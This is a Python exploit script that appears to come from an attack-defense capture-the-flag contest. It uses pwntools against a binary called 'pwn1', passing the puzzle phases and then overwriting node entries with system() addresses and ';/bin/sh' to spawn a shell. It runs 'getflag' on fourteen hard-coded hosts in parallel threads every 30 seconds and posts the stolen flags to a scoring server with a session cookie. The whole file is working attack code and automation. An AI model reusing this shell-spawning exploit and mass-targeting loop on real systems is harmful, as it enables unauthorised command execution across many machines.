import time, threading,os
from pwn import *
import requests
context.log_level = 'debug'

class MyThread(threading.Thread):
	def __init__(self, func, ip, port):  
		threading.Thread.__init__(self) 
		self.func = func
		self.ip = ip
		self.port = port
		#self.flag =''

  
	def run(self):  
		self.flag = self.func(self.ip, self.port)  
  
	def GetFlag(self):
		#print self.flag
		return self.flag  

def resend_cykor(ip,port):

	p=remote(ip,port)
	BIN_PATH = './pwn1'
	elf = ELF(BIN_PATH)
	try:
		# coding here 

		p.sendlineafter(' number!\n', str(8585))
	        p.sendlineafter(' numbers!\n', '[1, 1, 3, 5, 11, 21]')
	        p.sendlineafter('right?\n', 'mappingstringsforfunandprofit{\x00')

	        p.sendlineafter('phase 4.\n', '1 1 0 0 0 2 1;sh')
	        p.recvuntil('seecret...\n')
	        p.sendafter('node #1 to: ', p32(elf.plt['system']) + p32(elf.plt['system']))
	        p.sendafter('node #2 to: ', ';/bin/sh\0')
	        p.sendafter('node #3 to: ', p32(elf.plt['system']) + p32(0x08048696))
	        p.sendafter('node #4 to: ', p32(elf.plt['system']) + p32(elf.plt['system']))
	        p.sendafter('node #5 to: ', p32(elf.plt['system']) + p32(0x080484fa))
	        p.sendafter('node #6 to: ', p32(elf.plt['system']) + p32(elf.plt['system']))
	
	        p.sendline("getflag")
		p.recvuntil("[Result]: Congratulations!Your flag is : ")
		flag1 = p.recvline()
		print flag1
	        #p.interactive()
	        #raw_input()
	        p.close()
		#p.shutdown()
		return flag1.replace('\n','')

	except:
		p.close()		
		pass
	
#p.interactive()		
def GetExpList():
	return [resend_cykor]

def UpLoad(flag):
	for fg in flag:
		# how to submit flag
		#order = 'curl http://172.16.100.4:4000/conflict/sendconflictflag -d/ -d "flag=%s"' % fg
				
		#print order
		#os.system(order)
		url="http://172.16.100.4:4000/sendconflictflag"
		header={'referer':"http://172.16.100.4:4000/conflict",'Cookie':'MacaronSession=fbddc4e7fb4c6bd6'}
		data={'flag':fg}
		res= requests.post(url,data=data,headers=header)
		print res.content
if __name__ == '__main__':
	SleepTime = 30 # less than single round time
	ips = [('192.168.31.70', 8000),('192.168.31.113', 8000),('192.168.31.135', 8000),('192.168.32.60', 8000),('192.168.32.86', 8000),('192.168.32.104', 8000),('192.168.32.140', 8000),('192.168.33.43', 8000),('192.168.33.66', 8000),('192.168.33.122', 8000),('192.168.34.76', 8000),('192.168.34.100', 8000),('192.168.34.155', 8000),('192.168.35.35', 8000)]

	while 1:
		T = []
		for ip, port in ips:
			for func in GetExpList():
				T.append(MyThread(func, ip, port))

		for t in T:
			t.start()

		for t in T:
			t.join()

		flag = []
		for t in T:
			flag.append(t.GetFlag())

		UpLoad(flag)

		time.sleep(SleepTime)	
